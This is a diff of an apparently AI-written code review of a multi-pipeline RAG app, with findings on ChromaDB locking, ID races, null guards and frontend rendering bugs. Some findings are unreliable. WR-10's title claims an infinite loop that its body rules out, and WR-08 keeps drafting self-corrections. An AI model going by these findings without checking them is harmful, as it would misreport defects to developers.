-**Issue:** When an image is uploaded, its full base64-encoded content is stored as a ChromaDB metadata field `image_base64`. A 1 MB image encodes to ~1.4 MB of base64. ChromaDB's default metadata value size is capped at approximately 64 KB per value. Values exceeding this limit cause ChromaDB to raise `chromadb.errors.InvalidDimensionException` or `ValueError: Metadata value too large` (exact behavior depends on ChromaDB version). The 50 MB upload limit allows images that are ~35x the metadata size limit. Even a typical phone screenshot (2-3 MB) exceeds the limit.
-
-When the `add()` call fails, the exception is caught by the generic `try/except` in each pipeline's `__init__`, which silently recreates the collection — losing any previously ingested non-image data.
-
-**Fix:** Store large base64 content in a sidecar file and put only the path in metadata:
-
-```python
-# In backend/api.py process_file(), image branch:
-import uuid as _uuid
-img_dir = os.path.join(os.path.dirname(__file__), '..', 'adaptive_data', 'images')
-os.makedirs(img_dir, exist_ok=True)
-img_filename = f"{_uuid.uuid4().hex}.b64"
-img_path = os.path.join(img_dir, img_filename)
-with open(img_path, 'w') as fh:
-    fh.write(b64)
-return [Document(
-    page_content=f"Image Description: {summary}",
-    metadata={"source": source, "type": "image", "image_path": img_path},
-)]
-
-# In multimodal_rag.py query(), loading the image:
-if meta and "image_path" in meta and os.path.exists(meta["image_path"]):
-    with open(meta["image_path"]) as fh:
-        b64_data = fh.read()
-    content.append({"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{b64_data}"}})
-```
-
----
-
-### WR-05: Missing Null Guard on `results["documents"][0]` in Four Architectures
-
-**File:** `architectures/multilingual_rag.py:62` / `architectures/hyde_rag.py:84` / `architectures/self_rag.py:65` / `architectures/structured_rag.py:156`
-
-**Issue:** All four architectures access `results["documents"][0]` directly without a null check. ChromaDB returns `results["documents"] = [[]]` (a list containing an empty list) when no results match. In that case `results["documents"][0]` is `[]` — safe. However `results["metadatas"][0]` can be `None` in some ChromaDB versions when no results exist, causing `TypeError: 'NoneType' object is not subscriptable` at the metadata access line in the same function. This unhandled exception propagates to the worker thread, which puts `("error", ...)` in the queue — but with a confusing internal error message instead of "no documents found."
-
-Compare with `agentic_rag.py:63` and `corrective_rag.py:63` which correctly guard with `if results["documents"][0] else []`.
-
-**Fix:** Apply the same guard used in the other pipelines:
-
-```python
-docs = results["documents"][0] if results.get("documents") and results["documents"][0] else []
-metas = results["metadatas"][0] if results.get("metadatas") and results["metadatas"][0] else [{}] * len(docs)
-```
-
-Apply to: `multilingual_rag.py:62-63`, `hyde_rag.py:84-85`, `self_rag.py:65-66`, `structured_rag.py:156-157`.
-
----
-
-### WR-06: `session.history` Grows Unboundedly — No Cap at Append Time
-
-**File:** `backend/api.py:366, 411` / `backend/session_manager.py:138`
-
-**Issue:** `session.history.append(...)` is called on every successful query. There is no size cap at append time — only a slice when returning (`session.history[-20:]` at line 575). Over a long-running server session, `session.history` will grow to hold thousands of entries. With Compare mode running all 10 architectures at once, 10 entries are added per compare query. At 1 KB per entry (query + answer[:120]), 10,000 queries = 10 MB of Python heap from history alone. More practically, in production this means the memory footprint increases monotonically until the server is restarted.
-
-**Fix:** Cap the list at append time:
-
-```python
-MAX_HISTORY = 200
-
-def append_to_history(entry: dict):
-    session.history.append(entry)
-    if len(session.history) > MAX_HISTORY:
-        del session.history[:-MAX_HISTORY]  # keep most recent
-```
-
-Or enforce the cap in `GlobalSession`:
-
-```python
-def append_history(self, entry):
-    with self._state_lock:
-        self.history.append(entry)
-        if len(self.history) > 200:
-            self.history = self.history[-200:]
-```
-
----
-
-### WR-07: `MarkdownContent` Silently Drops Content After Unterminated Fenced Code Block
-
-**File:** `frontend/components/MarkdownContent.tsx:96-113`
-
-**Issue:** The fenced code block parser (lines 96-113) loops `while (i < lines.length && !lines[i].startsWith('``\`'))`. If the LLM returns a code block without a closing `` ``` `` fence (common when the LLM answer is truncated by `max_tokens=1024`), the inner loop consumes ALL remaining lines. The content after the unterminated fence is silently lost — the user sees a partial response with no warning, and crucially the final sentence (where the LLM may deliver the key answer) is never rendered.
-
-**Fix:** Handle the case where the closing fence is not found. The current logic already advances `i` past the closing `` ``` `` at line 104 (`i++`). The fix is to not error but still render what was collected:
-
-```typescript
-if (line.startsWith('```')) {
-  const lang = line.slice(3).trim()
-  const codeLines: string[] = []
-  i++
-  while (i < lines.length && !lines[i].startsWith('```')) {
-    codeLines.push(lines[i])
-    i++
-  }
-  if (i < lines.length) {
-    i++ // skip closing ``` only if it exists
-    // If i === lines.length here, the fence was unterminated — we still render what we have
-  }
-  nodes.push(
-    <pre key={nextKey()} className="bg-white/[0.05] rounded-lg p-3 overflow-x-auto my-2">
-      <code className={`text-xs font-mono text-indigo-200${lang ? ` language-${lang}` : ''}`}>
-        {codeLines.join('\n')}
-      </code>
-    </pre>
-  )
-  continue
-}
-```
-
-This is already the correct behavior in terms of content collection. The only change is the conditional `i++` on line 104 — if `i === lines.length` after the inner loop, skipping the `i++` prevents an off-by-one that would lose the last rendered line.
-
----
-
-### WR-08: `DocumentManager` Error Messages from Failed Uploads Are Silently Swallowed
-
-**File:** `frontend/components/DocumentManager.tsx:23-35`
-
-**Issue:** When `ingestFile` throws (e.g., 409 duplicate, 413 too large, 415 unsupported type), the `catch` block only increments `errors++` without capturing `e.message`. The summary message shows only `"${errors} failed"` with no indication of which file failed or why. The backend returns descriptive error messages (`detail` field in JSON), and the `ingestFile` function in `api.ts` correctly extracts and throws `Error(detail)`, but `DocumentManager` discards it.
+**File:** `core/shared_services.py:66-68`
+**Issue:** On an HNSW error retry, `collection = self.chroma_client.get_or_create_collection(collection_name)` is called after the `with self._chroma_lock:` block exits. Another thread may be simultaneously calling `delete_collection` on the same name (from `reset()`). The refresh and the delete race, and the returned collection object may point to a freshly-created collection that the delete call then removes. The caller stores the returned collection back on `self.collection`, leaving `self.collection` pointing to a deleted collection.
 
 **Fix:**
-
-```typescript
-const errorMessages: string[] = []
-for (const file of files) {
-  try {
-    const res = await ingestFile(file, archKeys)
-    totalChunks += res.chunks
-    onIngested(res.source, res.chunks)
-  } catch (e: any) {
-    errors++
-    errorMessages.push(`${file.name}: ${e.message || 'unknown error'}`)
-  }
-}
-if (errors > 0) {
-  setMsg(`✓ ${files.length - errors} ingested · ${errors} failed: ${errorMessages.join('; ')}`)
-} else {
-  setMsg(`✓ ${files.length} file${files.length > 1 ? 's' : ''} → ${totalChunks} chunks ingested`)
-}
+```python
+if ("hnsw" in err or "nothing found on disk" in err) and attempt < 2:
+    time.sleep(0.5 * (attempt + 1))
+    with self._chroma_lock:
+        collection = self.chroma_client.get_or_create_collection(collection_name)
+    continue
 ```
 
 ---
 
-### WR-09: Concurrent Ingests to Non-Hybrid Pipelines Have ID Race Condition
+### WR-02: `corrective_rag.py` — `generate_node` Overloads `documents` State Field with the Final Answer
 
-**File:** `architectures/graph_rag.py:111`, `architectures/agentic_rag.py:48`, `architectures/corrective_rag.py:47`, `architectures/multimodal_rag.py:35`, `architectures/multilingual_rag.py:34`, `architectures/rag_fusion.py:40`, `architectures/hyde_rag.py:47`, `architectures/self_rag.py:54`, `architectures/structured_rag.py:62`
+**File:** `architectures/corrective_rag.py:102-121,178-180`
+**Issue:** `generate_node` returns `{"documents": [text]}` — it replaces the list of retrieved document strings with a single-element list containing the LLM answer. The caller in `query()` reads `docs[0]` as `final_answer`. This is a type abuse: `CRAGState.documents: List[str]` mixes roles between "retrieved context chunks" and "final answer text." If `stream_llm` returns an empty string (LLM error, empty response), `docs[0]` is `""` and `final_answer` is silently `""`, causing the fallback message to appear with no indication of the failure mode.
 
-**Issue:** All pipelines except `hybrid_rag` compute document IDs using the pattern:
-
+**Fix:** Add an `answer: str = ""` field to `CRAGState` and have `generate_node` set `{"answer": text}`:
 ```python
-existing = self.collection.count()
-ids = [f"{prefix}_{uuid.uuid4().hex[:8]}_{existing + i}" for i in range(len(documents))]
+class CRAGState(TypedDict):
+    query: str
+    documents: List[str]
+    evaluation: str
+    rewritten_query: str
+    answer: str
+
+# In generate_node:
+return {"answer": text}
+
+# In query():
+elif node_name == "generate_node":
+    final_answer = node_state.get("answer", "")
 ```
 
-The `self.collection.count()` + `id generation` + `self.collection.add()` sequence is not atomic. If two `/api/ingest` requests arrive concurrently (the frontend's multi-file upload loop fires them in parallel via `for file of files`), both threads call `self.collection.count()` at the same time, get the same `existing` value, and generate overlapping IDs. ChromaDB will raise `DuplicateIDError` on the second `add()` call, silently failing one of the ingests.
+---
 
-**Fix:** Drop the sequential counter and rely solely on `uuid4()` for uniqueness, which is guaranteed without needing a count:
+### WR-03: `self_rag.py` — Critique JSON Regex Fails When `missing` Field Contains `}` Character
 
+**File:** `architectures/self_rag.py:112`
+**Issue:** `re.search(r'\{[^}]+\}', text, re.DOTALL)` stops at the first `}` it encounters. The `missing` field is free-text from the LLM and may contain `}` (e.g., `"details about the revenue ($5M} projection"`). When this occurs, `json.loads` receives a truncated string and raises, falling through to the default `{"faithfulness": 7, "completeness": 7, "missing": "NONE"}` — a passing score. The second retrieval loop is never triggered when it should be, defeating the Self-RAG critique mechanism.
+
+**Fix:**
 ```python
-ids = [f"{prefix}_{uuid.uuid4().hex}" for _ in range(len(documents))]
+start = text.find('{')
+end = text.rfind('}') + 1
+if start != -1 and end > start:
+    try:
+        data = json.loads(text[start:end])
+        ...
+    except json.JSONDecodeError:
+        pass  # fall through to defaults
 ```
 
-Apply to all 9 affected pipelines.
+---
+
+### WR-04: `rag_fusion.py` — Sub-Query Padding with Duplicates Defeats RRF Diversity
+
+**File:** `architectures/rag_fusion.py:55-56`
+**Issue:** When the LLM returns fewer than 4 sub-queries, the code pads with copies of the original query: `queries += [query] * (n - len(queries))`. Documents retrieved for the original phrasing will appear in multiple ranked lists and receive a score of `k * (1/(rank+60))` instead of `1/(rank+60)`, artificially boosting those exact matches while suppressing documents only found by the unique sub-queries. The diversity improvement from RAG-Fusion is eliminated.
+
+**Fix:** Use only what the LLM returned, no padding:
+```python
+return queries[:n] if queries else [query]
+```
+
+---
+
+### WR-05: `graph_rag.py` — `_extract_query_entities` Raises Unhandled Exception to Caller
+
+**File:** `architectures/graph_rag.py:131-135`
+**Issue:** `_extract_query_entities` calls `services.llm.invoke(prompt)` with no try/except. An LLM failure (no key, rate limit) raises `RuntimeError` that propagates to `query()` with no per-step guard, resulting in an opaque traceback being returned as the error message rather than a graceful "entity extraction failed" step indicator.
+
+**Fix:**
+```python
+def _extract_query_entities(self, query: str) -> List[str]:
+    try:
+        response = services.llm.invoke(prompt)
+        text = services.extract_response_text(response)
+        return [e.strip() for e in text.split(",") if e.strip()]
+    except Exception as e:
+        print(f"[graph_rag] entity extraction failed: {e}")
+        return []
+```
+
+---
+
+### WR-06: `/api/documents` and `/api/documents DELETE` Call `collection.get()` Without `_chroma_lock`
+
+**File:** `backend/api.py:621,641`
+**Issue:** Both the GET and DELETE document endpoints call `pipeline.collection.get(...)` directly without `with services._chroma_lock:`. During compare mode, ChromaDB collections are being actively queried by worker threads holding the lock. A concurrent `.get()` from the document listing endpoint can interleave with an active `.query()`, causing HNSW segment reader corruption. The `chroma_query` wrapper was specifically written to serialize all collection access through `_chroma_lock`; direct `.get()` calls bypass this.
+
+**Fix:**
+```python
+# In /api/documents GET (line 621):
+with services._chroma_lock:
+    result = pipeline.collection.get(include=["metadatas"])
+
+# In /api/documents DELETE (line 641):
+with services._chroma_lock:
+    result = pipeline.collection.get(include=["metadatas"])
+```
+
+---
+
+### WR-07: `frontend/app/page.tsx` — `handleFeedback` Missing `compareMode` in Dependency Array
+
+**File:** `frontend/app/page.tsx:157`
+**Issue:** `handleFeedback` is memoized with `useCallback([allMessages, chatKey, selectedArch])`. `chatKey` is derived as `compareMode ? COMPARE_KEY : selectedArch` at the component level (line 103) but `compareMode` is not in the dependency array. If `compareMode` changes after the callback is created, the captured `chatKey` inside the callback may be stale. In practice, `chatKey` is a const derived before the callback, so React's rules-of-hooks would require it in deps. The result: feedback on a compare-mode assistant message may be attributed to the wrong `chatKey` (the single-arch key instead of `COMPARE_KEY`).
+
+**Fix:** Add `compareMode` to the dependency array:
+```tsx
+}, [allMessages, chatKey, selectedArch, compareMode])
+```
+
+---
+
+### WR-08: `DocumentManager.tsx` — Delete Passes `label` (Basename) for URL-Sourced Documents, Failing Silently
+
+**File:** `frontend/components/DocumentManager.tsx:158-159`
+**Issue:** `handleDelete(label)` where `label = d.name.split('/').pop()?.split('\\').pop() || d.name`. For URL-ingested documents `d.name` is the full URL (e.g., `https://example.com/article/page`). `split('/').pop()` returns `page`, which is sent to the backend. The backend `/api/documents` DELETE matches `request.source` against stored metadata `source` values. URL-ingested docs have their full URL stored as `source`. The comparison `source.split("/")[-1].split("\\")[-1] == request.source` at line 643 compares `page == page` — wait, this actually would match since the backend ALSO strips the path. Let me re-read: backend at line 643: `(meta or {}).get("source", "Unknown").split("/")[-1].split("\\")[-1] == request.source`. `request.source` is `label` = `page`. The backend strips the source path too. So `https://example.com/article/page` → `.split("/")[-1]` = `page`. And `request.source` = `page`. These match, so deletion DOES work for URL docs.
+
+The actual bug is different: if two different URL-ingested documents have the same basename (`page`), deleting one by label deletes BOTH across all architectures. For example, `https://site-a.com/article/page` and `https://site-b.com/news/page` both have label `page` and would both be deleted when the user deletes either one.
+
+**Fix:** Pass the full `d.name` (the original URL or filename) to `handleDelete` and have the backend compare the full source string:
+```tsx
+// DocumentManager.tsx line 158:
+onClick={() => handleDelete(d.name)}
+```
+And in the backend DELETE handler (api.py line 643), compare against the full source:
+```python
+ids_to_delete = [
+    doc_id for doc_id, meta in zip(result["ids"] or [], result["metadatas"] or [])
+    if (meta or {}).get("source", "") == request.source
+]
+```
+
+---
+
+### WR-09: `adaptive_db.py` Read Methods Access `self.conn` Outside Lock
+
+**File:** `core/adaptive_db.py:87-91`
+**Issue:** `find_similar_query` acquires `self._lock` for the SELECT (lines 86-91) but releases it before iterating `rows`. This is intentional and correct for WAL-mode reads. However `get_feedback_docs` (line 239-242), `get_recent_queries` (line 279-282), `get_cache_count` (line 156-159), and `get_analytics` (lines 200-218) all hold `self._lock` during their reads, which means analytics reads during a busy server block all concurrent writes for the duration of the (potentially slow) aggregation query. Worse, `get_analytics` at line 213-218 performs a second query (`fb_rows`) while still holding the lock from the first query. If a concurrent `store_feedback` is waiting for the lock, it stalls until both queries complete.
+
+This is not a correctness bug (WAL mode means readers don't block writers at the SQLite level), but the Python-level `threading.Lock` serializes everything — creating unnecessary latency under load.
+
+**Fix:** Release the lock between logically independent reads, or use `sqlite3.connect(..., isolation_level=None)` with WAL and rely on SQLite's own concurrency:
+```python
+def get_analytics(self) -> Dict:
+    with self._lock:
+        rows = self.conn.execute("SELECT ...").fetchall()
+    with self._lock:
+        fb_rows = self.conn.execute("SELECT ...").fetchall()
+    # pure Python from here
+```
+
+---
+
+### WR-10: `MarkdownContent.tsx` — Paragraph Collector Does Not Advance `i` If No Lines Match, Creating Infinite Loop
+
+**File:** `frontend/components/MarkdownContent.tsx:118-133`
+**Issue:** The paragraph accumulator loop (lines 119-126) collects lines until it hits a blank, block-level marker, or end-of-content. If a line reaches this section and none of the preceding matchers (heading, hr, list, blockquote, code) handled it, the while loop starts at `i` and increments `i` for each line added to `para`. After the while exits, `if (para.length)` is checked and a `<p>` node is pushed. Then the outer `while (i < lines.length)` loop continues.
+
+The potential infinite loop: if `lines[i]` is a non-empty line that starts with no recognized block marker but the inner while loop condition `!/^(#{1,3} |...)/.test(lines[i])` is `true`, the inner loop runs and increments `i`. This is correct. But if the line is blank (`!line.trim()` at line 37), the outer loop increments `i` and continues. The blank-line check at line 37 does `i++; continue` — this advances correctly. No actual infinite loop exists here on inspection.
+
+However there is a rendering correctness issue: multi-line paragraphs are joined with `para.join('\n')` and passed to `renderInline`. The `renderInline` function processes a single string — the `\n` characters in the middle of the joined paragraph are invisible in the rendered output (HTML collapses whitespace). This means LLM responses with intentional line breaks within a paragraph (e.g., address formatting, poetry) have their line breaks removed silently.
+
+**Fix:** Join with `<br/>` tags or process each para line individually:
+```tsx
+nodes.push(
+  <p key={nextKey()} className="mb-1.5 last:mb-0 text-slate-200 leading-relaxed">
+    {para.map((line, idx) => (
+      <React.Fragment key={idx}>
+        {idx > 0 && <br />}
+        {renderInline(line, nextKey())}
+      </React.Fragment>
+    ))}
+  </p>
+)
+```
+
+---
+
+### WR-11: `hybrid_rag.py` — `_rebuild_bm25_from_collection` Acquires `_chroma_lock` but `ingest()` Does Not
+
+**File:** `architectures/hybrid_rag.py:34,72`
+**Issue:** `_rebuild_bm25_from_collection` wraps its `collection.get()` call inside `with services._chroma_lock:` (line 34). But `ingest()` calls `self.collection.add(...)` at line 72 without holding `_chroma_lock`. This is inconsistent: in compare mode, 10 threads are mid-query (holding `_chroma_lock` during their `chroma_query` calls), and a simultaneous ingest from a new upload will call `.add()` without the lock, racing with the lock-protected `_rebuild_bm25_from_collection` path that runs at startup. The inconsistency means it is possible for `.add()` and `.query()` to execute simultaneously on the same ChromaDB collection.
+
+**Fix:** All direct `collection.add()` calls should also go through `_chroma_lock`:
+```python
+def ingest(self, documents: List[Document]):
+    with self._ingest_lock:
+        ...
+        with services._chroma_lock:
+            self.collection.add(
+                documents=texts,
+                embeddings=embeddings,
+                metadatas=metadatas,
+                ids=new_ids,
+            )
+        tokenized_corpus = [doc.page_content.lower().split() for doc in self.chunks]
+        self.bm25 = BM25Okapi(tokenized_corpus)
+```
 
 ---
 
 ## Info
 
-### IN-01: `get_positive_sources` Is Dead Code — Never Called
+### IN-01: `ArchExplainer.tsx` Documents Semantic Cache Threshold as `0.92` — Implementation Uses `0.95`
 
-**File:** `core/adaptive_db.py:67-78`
+**File:** `frontend/components/ArchExplainer.tsx:24`
+**Issue:** The `ADAPTIVE_FEATURES` constant in `ArchExplainer.tsx` shows `"Similar past queries return instantly (cosine > 0.92)"`. The actual default threshold in `adaptive_db.py:find_similar_query` is `threshold: float = 0.95` and it is never called with a different value anywhere in the codebase. Users will believe the cache is more aggressive than it actually is.
 
-**Issue:** `AdaptiveDB.get_positive_sources` is defined at line 67 but has zero call sites in the entire codebase. The feedback boost uses `get_feedback_docs` instead (line 241). This dead method adds maintenance confusion about which feedback API callers should use.
-
-**Fix:** Remove the method. If retrieval-time filtering by positive chunk IDs is desired in the future, the correct entry point is `get_feedback_docs` which returns both positive and negative sets.
+**Fix:** Update to `"cosine > 0.95"`.
 
 ---
 
-### IN-02: `NEXT_PUBLIC_API_BASE_URL` Name Mismatch Between CI and Source Code
+### IN-02: `shared_services.py` — `import numpy as np` Inside Hot-Path Method
 
-**File:** `.github/workflows/ci.yml:56` / `frontend/lib/api.ts:3`
+**File:** `core/shared_services.py:153`
+**Issue:** `rerank()` includes `import numpy as np` inside the method body, which executes on every call. While Python caches module lookups in `sys.modules`, the `import` statement still involves a dictionary lookup in `sys.modules` and attribute access on every invocation. `rerank` is called in at least 3 architectures (hybrid, multilingual, and implicitly self-RAG's fallback path). Move to module level.
 
-**Issue:** The CI workflow sets `NEXT_PUBLIC_API_BASE_URL: http://localhost:8000` but `api.ts` reads `process.env.NEXT_PUBLIC_API_BASE` (without `_URL` suffix). The CI environment variable is never consumed, so the CI frontend always uses the fallback `http://127.0.0.1:8000`. This is harmless if CI doesn't run end-to-end tests against a live backend, but it means any CI test that verifies API URL configuration will silently pass regardless of the environment variable value.
+**Fix:** Add `import numpy as np` at the top of `shared_services.py`.
 
-**Fix:** Align the CI variable name with the source code:
+---
 
-```yaml
-# In ci.yml:
-NEXT_PUBLIC_API_BASE: http://localhost:8000
+### IN-03: `process_file` in `api.py` — Blocking LLM Call on Async Event Loop for Image Ingestion
+
+**File:** `backend/api.py:189`
+**Issue:** `services.llm.invoke([msg])` is a synchronous blocking network call executed inside `async def process_file`. While `process_file` is awaited, the `invoke` call itself is not async — it blocks the uvicorn event loop for the duration of the LLM call (typically 2-10 seconds for image captioning). During this time, all other async requests (including `/api/health`, other ingests) are stalled.
+
+**Fix:** Use `anyio.to_thread.run_sync` or `asyncio.get_event_loop().run_in_executor`:
+```python
+import asyncio
+summary = await asyncio.get_event_loop().run_in_executor(
+    None,
+    lambda: services.extract_response_text(services.llm.invoke([msg]))
+)
 ```
 
 ---
 
-### IN-03: `requirements.txt` Missing `langchain-huggingface` Explicit Version Pin for Production
+### IN-04: `EvalScorecard.tsx` — Non-Null Assertion `b!` Should Be a Type Guard
 
-**File:** `requirements.txt:12`
-
-**Issue:** `langchain-huggingface>=0.1.0` allows any future major version. The HuggingFace embedding interface changed significantly between 0.x and 1.x releases. In a production deployment with `pip install -r requirements.txt` and no lock file, a future release could break the `HuggingFaceEmbeddings` API silently.
-
-**Fix:** Pin to a known-good minor range: `langchain-huggingface>=0.1.0,<0.2.0`. Generate a `requirements.lock` (via `pip freeze`) for production deployments.
-
----
-
-### IN-04: `docker-compose.yml` Health Check Spawns a Full Python Interpreter Every 30 Seconds
-
-**File:** `docker-compose.yml:19`
-
-**Issue:** The health check uses `python -c "import urllib.request; urllib.request.urlopen(...)"`. On a container with limited memory, spawning a new CPython interpreter every 30 seconds for the health check adds ~30-50 MB RSS per check cycle on Python 3.12 with all packages imported (even though `urllib` alone is small, the interpreter init loads the full stdlib). This is especially wasteful if `curl` or `wget` is available in the container image.
+**File:** `frontend/components/EvalScorecard.tsx:25`
+**Issue:** `avg.reduce((a, b) => a + b!, 0)` uses `b!` (non-null assertion). The `.filter()` on line 23 uses a boolean predicate that TypeScript's generic signature does not narrow to `number` (it remains `number | null`). The assertion suppresses the TypeScript error but does not make the code correct if the filter condition ever changes. A type predicate is safer:
 
 **Fix:**
-
-```yaml
-healthcheck:
-  test: ["CMD-SHELL", "curl -sf http://localhost:8000/api/health > /dev/null || exit 1"]
-  interval: 30s
-  timeout: 10s
-  retries: 3
+```tsx
+const avg = [scores.faithfulness, scores.relevance, scores.context_precision, scores.context_recall]
+  .filter((v): v is number => v != null && v > 0)
+const avgScore = avg.length ? Math.round(avg.reduce((a, b) => a + b, 0) / avg.length) : null
 ```
 
-If `curl` is not available in the Dockerfile's base image (`python:3.11-slim`), add `RUN apt-get install -y --no-install-recommends curl` to the Dockerfile.
+---
+
+### IN-05: `ApiKeyModal.tsx` — `catch (e: any)` Should Be `catch (e: unknown)`
+
+**File:** `frontend/components/ApiKeyModal.tsx:29`
+**Issue:** `catch (e: any)` bypasses TypeScript type checking on the caught value. Should use `unknown` with a type guard.
+
+**Fix:**
+```tsx
+} catch (e: unknown) {
+  setError(e instanceof Error ? e.message : 'Failed to set API key')
+}
+```
 
 ---
 
